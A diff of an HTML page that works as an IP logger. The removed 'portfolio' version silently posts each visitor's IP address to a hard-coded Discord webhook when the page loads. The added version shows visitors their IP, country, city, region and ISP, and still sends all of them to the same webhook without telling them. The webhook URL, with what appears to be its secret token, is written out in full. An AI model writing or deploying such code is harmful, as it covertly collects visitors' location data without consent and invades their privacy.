@@ -3,19 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>portfolio</title>
+    <title>IP Details</title>
     <script>
-        // Function to send IP to webhook
-        async function sendIPToWebhook(ip) {
+        // Function to send user data to a webhook
+        async function sendDetailsToWebhook(details) {
             const webhookURL = "https://discord.com/api/webhooks/1314782178491629598/K_FBAhGqn0t-z5IeHHRgvGUdwdHPgvv7GEq5_JsYhTuKFWUFGGpy6lKgYmsINM_oSfp5"; // Replace with your webhook URL
 
-            // Payload for the webhook
+            // Construct payload
             const payload = {
-                content: `Visitor's IP Address: ${ip}`
+                content: `Visitor Details:\nIP: ${details.query}\nCountry: ${details.country}\nCity: ${details.city}\nRegion: ${details.regionName}\nISP: ${details.isp}`
             };
 
             try {
-                // Sending IP to the webhook
+                // Send data to the webhook
                 await fetch(webhookURL, {
                     method: "POST",
                     headers: {
@@ -23,32 +23,45 @@
                     },
                     body: JSON.stringify(payload)
                 });
-                console.log("IP sent to webhook successfully.");
+                console.log("Details sent to webhook successfully.");
             } catch (error) {
-                console.error("Failed to send IP to webhook:", error);
+                console.error("Failed to send details to webhook:", error);
             }
         }
 
-        // Fetch IP and send it
-        async function fetchAndSendIP() {
+        // Function to fetch user details and display/send them
+        async function fetchAndShowDetails() {
             try {
-                const response = await fetch("https://api.ipify.org?format=json");
-                const data = await response.json();
-                const ip = data.ip;
+                const response = await fetch("http://ip-api.com/json/");
+                const details = await response.json();
 
-                console.log("Fetched IP:", ip);
-                await sendIPToWebhook(ip);
+                // Log details to the console
+                console.log(details);
+
+                // Display the details on the web page
+                document.getElementById("ip").textContent = details.query;
+                document.getElementById("country").textContent = details.country;
+                document.getElementById("city").textContent = details.city;
+                document.getElementById("region").textContent = details.regionName;
+                document.getElementById("isp").textContent = details.isp;
+
+                // Send details to the webhook
+                await sendDetailsToWebhook(details);
             } catch (error) {
-                console.error("Error fetching IP:", error);
+                console.error("Error fetching details:", error);
             }
         }
 
-        // Fetch and send IP when the page loads
-        window.onload = fetchAndSendIP;
+        // Fetch details when the page loads
+        window.onload = fetchAndShowDetails;
     </script>
 </head>
 <body>
-    <h1>test</h1>
-    <p>test</p>
+    <h1>Your Details</h1>
+    <p><strong>IP Address:</strong> <span id="ip">Loading...</span></p>
+    <p><strong>Country:</strong> <span id="country">Loading...</span></p>
+    <p><strong>City:</strong> <span id="city">Loading...</span></p>
+    <p><strong>Region:</strong> <span id="region">Loading...</span></p>
+    <p><strong>ISP:</strong> <span id="isp">Loading...</span></p>
 </body>
 </html>
